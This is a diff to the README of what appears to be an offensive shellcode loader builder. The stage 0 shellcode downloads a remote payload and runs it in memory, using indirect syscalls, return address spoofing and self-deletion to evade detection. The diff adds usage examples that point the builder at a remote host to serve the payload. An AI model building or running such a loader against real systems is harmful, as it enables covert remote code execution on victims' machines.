@@ -4,7 +4,9 @@ Stage 0 Shellcode to Download a Remote Payload and Execute it in Memory
 
 The Nt API calls ```NtAllocateVirtualMemory``` and ```NtProtectVirtualMemory``` are made using indirect syscalls.
 
-```LoadLibraryA``` and WinHTTP calls are performed with return address spoofing.
+LoadLibraryA and WinHTTP calls are performed with return address spoofing.
+
+When the shellcode is executed in a spoofed thread, the stage 0 self-deletes from memory.
 
 # Usage
 
@@ -48,12 +50,19 @@ The Nt API calls ```NtAllocateVirtualMemory``` and ```NtProtectVirtualMemory``` 
       <td>No</td>
       <td>Empty</td>
     </tr>
+     <tr>
+      <td>-v</td>
+      <td>View shellcode at C format</td>
+      <td>No</td>
+      <td>Empty</td>
+    </tr>
   </tbody>
 </table>
 
 Example :
-- python3 builder.py -u 10.10.100.121 -u /path/to/shellcode.bin -p 80
-- python3 builder.py -u 10.10.100.121 -u /path/to/shellcode.bin -p 443 -s
+- ```python3 builder.py -u 10.10.100.121 -u /path/to/shellcode.bin -p 80```
+- ```python3 builder.py -u 10.10.100.121 -u /path/to/shellcode.bin -p 443 -s```
+- ```python3 builder.py -u 10.10.100.121 -u /path/to/shellcode.bin -p 8080 -v```
 
 # Credit
 
